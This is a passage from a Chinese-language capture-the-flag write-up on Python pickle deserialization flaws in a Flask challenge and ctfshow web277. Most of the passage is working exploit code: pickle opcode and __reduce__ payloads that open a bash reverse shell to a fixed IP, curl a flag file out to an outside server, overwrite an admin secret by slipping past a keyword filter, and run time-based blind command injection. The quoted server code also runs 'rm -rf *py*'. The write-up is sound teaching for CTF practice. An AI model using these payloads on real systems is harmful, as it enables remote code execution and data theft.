        # cursor=conn.cursor()
        # cursor.execute(f"select password from usertable where username='{username}'")
        # data=cursor.fetchall()[0]
        # if data:
        #     return data[0] 
        # else:
        #     return None
        return session.get("password")

@app.route('/balancer', methods=['GET', 'POST'])
def flag():
    pickle_data=base64.b64decode(request.cookies.get("userdata"))
    if b'R' in pickle_data or b"secret" in pickle_data:
        return "You damm hacker!"
    os.system("rm -rf *py*")
    userdata=pickle.loads(pickle_data)
    if userdata.token!=hash(get_password(userdata.username)):
         return "Login First"
    if userdata.username=='admin':
        return "Welcome admin, here is your next challenge!"
    return "You're not admin!"

@app.route('/login', methods=['GET', 'POST'])
def login():
    resp = make_response("success") 
    session["password"]=request.values.get("password")
    resp.set_cookie("userdata", base64.b64encode(pickle.dumps(User(request.values.get("username"),request.values.get("password")),2)), max_age=3600)
    return resp

@app.route('/', methods=['GET', 'POST'])
def index():
    return open('source.txt',"r").read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


```

在`/balancer`中利用`pickle.loads`的反序列化漏洞

#### 解法1

直接利用反序列化来getshell

这儿的`opcode`可以利用[pker工具](https://github.com/EddieIvan01/pker)来写

pker：

```
system=GLOBAL('os', 'system')
system('bash -c "bash -i >& /dev/tcp/192.168.11.21/8888 0>&1"')
return
```

然后：

```
python3 pker.py < test/crash
```

![image-20220807180548465](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220807180548465.png)

就可以生成opcode

```txt
payload=b'(cos\nsystem\nX\x36\x00\x00\x00bash -c "bash -i >& /dev/tcp/xx.xxx.xxx.xxx/8888 0>&1"o.'
print(base64.b64encode(payload))
```

成功上线

#### 解法2

还是构造opcode

但是根据源码提示，我们需要登录admin账号才能进入下一个挑战

因为app中导入了admin，所以直接可以通过app修改admin的内容

`secret`我们利用十六进制绕过`\\x73ecret`

```
capp
admin
(S'\\x73ecret'
S'1'
db.
```

我们base64加密，直接传进去，成功修改admin密码为1，然后登录

也可以下面这个：利用unicode字符绕过secret

```
c__main__
admin
p0
(dp1
Vsecre\u0074
p2
S'1'
p3
sb.
```

###  ctfshow web277

![image-20220808094856295](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220808094856295.png)

比较直接，直接利用reduce构造

```
#!/usr/bin/env python

import os
import pickle
import base64

class exp(object):
    def __reduce__(self):
        return os.system, ('curl http://42.193.170.176:2345?a=`cat fla*`',)

print(base64.b64encode(pickle.dumps(exp())))
m=base64.b64decode(base64.b64encode(pickle.dumps(exp())))
pickle.loads(m)
```

也可以利用RCE盲注：

```
#!/usr/bin/env python

import os
import pickle
import base64


class RunCmd(object):
    def __reduce__(self):
        return os.system, ('if [ `cut -c 1 ./flag` = 'f' ];then sleep 4;fi',)


print(base64.b64encode(pickle.dumps(RunCmd())))

```



##  参考链接

https://xz.aliyun.com/t/7436#toc-12